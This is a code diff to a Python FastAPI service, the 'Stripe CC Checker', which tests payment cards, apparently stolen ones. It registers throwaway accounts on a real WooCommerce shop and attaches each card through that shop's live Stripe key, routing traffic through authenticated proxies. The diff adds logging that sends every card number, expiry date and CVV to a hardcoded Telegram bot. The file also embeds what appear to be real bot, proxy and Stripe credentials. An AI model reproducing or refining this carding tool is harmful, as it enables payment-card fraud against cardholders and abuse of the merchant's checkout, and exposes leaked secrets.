@@ -12,16 +12,13 @@ import uvicorn
 app = FastAPI()
 
 # --- Environment Variables ---
-# Telegram bot info
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8411567693:AAE7Yqpy4u9YZqL5DT3-hb0NZgLqTfnFEL0") # Replace with your actual bot token
 USER_ID = os.getenv("USER_ID", "1409419332")     # Replace with your actual user ID
 
-# Proxy info
 PROXY_URL = os.getenv("PROXY_URL", "http://na.proxys5.net:6200")
 PROXY_USERNAME = os.getenv("PROXY_USERNAME", "89565483-zone-custom")
 PROXY_PASSWORD = os.getenv("PROXY_PASSWORD", "M5o5HIxR")
 
-# --- Utility Functions (from your script) ---
 def parseX(data, start, end):
     try:
         star = data.index(start) + len(start)
@@ -47,21 +44,30 @@ async def make_request(
     json=None,
     proxy=None,
     proxy_auth=None,
+    logs=None,
+    step_name=""
 ):
-    async with session.request(
-        method,
-        url,
-        params=params,
-        headers=headers,
-        data=data,
-        json=json,
-        proxy=proxy,
-        proxy_auth=proxy_auth,
-    ) as response:
-        return await response.text()
+    try:
+        async with session.request(
+            method,
+            url,
+            params=params,
+            headers=headers,
+            data=data,
+            json=json,
+            proxy=proxy,
+            proxy_auth=proxy_auth,
+        ) as response:
+            resp_text = await response.text()
+            if logs is not None:
+                logs.append(f"Step: {step_name}\nURL: {url}\nStatus: {response.status}\nResponse:\n{resp_text}\n")
+            return resp_text
+    except Exception as e:
+        if logs is not None:
+            logs.append(f"Step: {step_name}\nURL: {url}\nError: {e}\n")
+        return f"Error: {e}"
 
-async def send_telegram_message(card_details, bin_info):
-    message = f"✅ LIVE CC: {card_details}\nBIN INFO: {bin_info}"
+async def send_telegram_message(message):
     api_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     payload = {
         "chat_id": USER_ID,
@@ -71,33 +77,31 @@ async def send_telegram_message(card_details, bin_info):
     async with aiohttp.ClientSession() as session:
         try:
             await session.post(api_url, data=payload)
-            print(f"Telegram notification sent for: {card_details}")
         except Exception as e:
             print(f"Error sending Telegram notification: {e}")
 
-async def get_bin_info(bin_number):
+async def get_bin_info(bin_number, logs=None):
     url = f"https://bins.antipublic.cc/bins/{bin_number}"
     async with aiohttp.ClientSession() as session:
         try:
             resp = await session.get(url)
-            if resp.status == 200:
-                return await resp.text()
-            else:
-                return "BIN info not found"
+            bin_info = await resp.text() if resp.status == 200 else "BIN info not found"
+            if logs is not None:
+                logs.append(f"Step: BIN Info\nURL: {url}\nStatus: {resp.status}\nResponse:\n{bin_info}\n")
+            return bin_info
         except Exception as e:
+            if logs is not None:
+                logs.append(f"Step: BIN Info\nURL: {url}\nError: {e}\n")
             return f"BIN info error: {e}"
 
-# --- Main Checker Logic ---
 async def stripe_auth_logic(cc: str, mon: str, year: str, cvv: str):
     start_time = datetime.now()
+    logs = []
     full_card_details = f"{cc}|{mon}|{year}|{cvv}"
-    
-    # Ensure year is 2-digit
     year_2digit = year[-2:]
-
     proxy_auth_obj = aiohttp.BasicAuth(PROXY_USERNAME, PROXY_PASSWORD) if PROXY_USERNAME and PROXY_PASSWORD else None
-
     connector = aiohttp.TCPConnector(ssl=False)
+
     async with aiohttp.ClientSession(connector=connector) as my_session:
         headers = {
             "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
@@ -117,7 +121,6 @@ async def stripe_auth_logic(cc: str, mon: str, year: str, cvv: str):
         }
         
         try:
-            # Step 1: Get register nonce
             req1_text = await make_request(
                 my_session,
                 url="https://www.georgedaviesturf.co.uk/my-account",
@@ -125,13 +128,15 @@ async def stripe_auth_logic(cc: str, mon: str, year: str, cvv: str):
                 headers=headers,
                 proxy=PROXY_URL,
                 proxy_auth=proxy_auth_obj,
+                logs=logs,
+                step_name="Get Register Nonce"
             )
             await asyncio.sleep(1)
             nonce = parseX(req1_text, 'name="woocommerce-register-nonce" value="', '"')
             if nonce == "None":
+                logs.append("Failed to extract woocommerce-register-nonce\n")
                 raise ValueError("Failed to extract woocommerce-register-nonce")
 
-            # Step 2: Register random account
             headers2 = headers.copy()
             headers2.update({
                 "content-type": "application/x-www-form-urlencoded",
@@ -168,10 +173,11 @@ async def stripe_auth_logic(cc: str, mon: str, year: str, cvv: str):
                 data=data2,
                 proxy=PROXY_URL,
                 proxy_auth=proxy_auth_obj,
+                logs=logs,
+                step_name="Register Random Account"
             )
             await asyncio.sleep(1)
 
-            # Step 3: Add payment method nonce
             req3_text = await make_request(
                 my_session,
                 url="https://www.georgedaviesturf.co.uk/my-account/add-payment-method/",
@@ -179,14 +185,16 @@ async def stripe_auth_logic(cc: str, mon: str, year: str, cvv: str):
                 headers=headers,
                 proxy=PROXY_URL,
                 proxy_auth=proxy_auth_obj,
+                logs=logs,
+                step_name="Add Payment Method Nonce"
             )
             await asyncio.sleep(2)
             addpmnonce = parseX(req3_text, 'name="woocommerce-add-payment-method-nonce" value="', '"')
             rest_nonce = parseX(req3_text, '"createAndConfirmSetupIntentNonce":"', '"')
             if addpmnonce == "None" or rest_nonce == "None":
+                logs.append("Failed to extract payment method nonces\n")
                 raise ValueError("Failed to extract payment method nonces")
 
-            # Step 4: Stripe API payment method creation
             headers4 = {
                 "accept": "application/json",
                 "accept-language": "en-US,en;q=0.9",
@@ -227,7 +235,7 @@ async def stripe_auth_logic(cc: str, mon: str, year: str, cvv: str):
                 "guid": "NA",
                 "muid": "NA",
                 "sid": "NA",
-                "key": "pk_live_51OCKXEAPMeRp4YIca4hWzwyYQnAllzcTDlBQ76zKfkErhZEyh5aOPCLixfOnAt1oV31EfTX2CGTu40JVnrLvQL7r0078s5MPx5", # Hardcoded as per user's original script
+                "key": "pk_live_51OCKXEAPMeRp4YIca4hWzwyYQnAllzcTDlBQ76zKfkErhZEyh5aOPCLixfOnAt1oV31EfTX2CGTu40JVnrLvQL7r0078s5MPx5",
                 "_stripe_version": "2024-06-20",
             }
             req4_text = await make_request(
@@ -237,12 +245,14 @@ async def stripe_auth_logic(cc: str, mon: str, year: str, cvv: str):
                 data=json_data4,
                 proxy=PROXY_URL,
                 proxy_auth=proxy_auth_obj,
+                logs=logs,
+                step_name="Stripe API Payment Method Creation"
             )
             pmid = parseX(req4_text, '"id": "', '"')
             if pmid == "None":
+                logs.append("Failed to extract payment method ID from Stripe API response\n")
                 raise ValueError("Failed to extract payment method ID from Stripe API response")
 
-            # Step 5: Confirm payment method
             headers5 = {
                 "accept": "*/*",
                 "accept-language": "en-US,en;q=0.9",
@@ -274,16 +284,16 @@ async def stripe_auth_logic(cc: str, mon: str, year: str, cvv: str):
                 data=data5,
                 proxy=PROXY_URL,
                 proxy_auth=proxy_auth_obj,
+                logs=logs,
+                step_name="Confirm Payment Method"
             )
 
-            # Result handling
             status = "Unknown"
             response_message = "Unknown response from checker"
-            
+
             if "succeeded" in req5_text:
                 bin_number = cc[:6]
-                bin_info = await get_bin_info(bin_number)
-                await send_telegram_message(full_card_details, bin_info)
+                bin_info = await get_bin_info(bin_number, logs=logs)
                 status = "Authorized"
                 response_message = "Card Added"
             elif "requires_action" in req5_text:
@@ -293,35 +303,55 @@ async def stripe_auth_logic(cc: str, mon: str, year: str, cvv: str):
                 error_resp = parseX(req5_text, '"message":"', '"')
                 status = "Declined"
                 response_message = error_resp if error_resp != "None" else "Card declined by issuer"
-            
+
             end_time = datetime.now()
             execution_time = (end_time - start_time).total_seconds()
+
+            full_log = (
+                f"✅ CC Checker Log\n"
+                f"Card: {full_card_details}\n"
+                f"Status: {status}\n"
+                f"Response: {response_message}\n"
+                f"Execution Time: {execution_time:.2f}s\n\n"
+                f"--- Logs ---\n" +
+                "\n".join(logs)
+            )
+            await send_telegram_message(full_log)
 
             return {
                 "status": status,
                 "response": response_message,
                 "card_details": full_card_details,
-                "execution_time": f"{execution_time:.2f}s"
+                "execution_time": f"{execution_time:.2f}s",
+                "logs": logs
             }
 
         except Exception as e:
             end_time = datetime.now()
             execution_time = (end_time - start_time).total_seconds()
+            error_log = (
+                f"❌ CC Checker Error\n"
+                f"Card: {full_card_details}\n"
+                f"Error: {str(e)}\n"
+                f"Execution Time: {execution_time:.2f}s\n\n"
+                f"--- Logs ---\n" +
+                "\n".join(logs)
+            )
+            await send_telegram_message(error_log)
             return {
                 "status": "Error",
                 "response": f"Processing error: {str(e)}",
                 "card_details": full_card_details,
-                "execution_time": f"{execution_time:.2f}s"
+                "execution_time": f"{execution_time:.2f}s",
+                "logs": logs
             }
 
-# --- FastAPI Models ---
 class CardDetails(BaseModel):
     cc: str
     mon: str
     year: str
     cvv: str
 
-# --- FastAPI Endpoint ---
 @app.post("/check-cc")
 async def check_credit_card(card_details: CardDetails):
     """
@@ -335,11 +365,10 @@ async def check_credit_card(card_details: CardDetails):
     )
     return result
 
-# --- Health Check Endpoint ---
 @app.get("/health")
 async def health_check():
     return {"status": "healthy", "service": "Stripe CC Checker"}
 
-# To run locally for testing:
+# Uncomment to run locally for testing:
 # if __name__ == "__main__":
 #     uvicorn.run(app, host="0.0.0.0", port=8000)
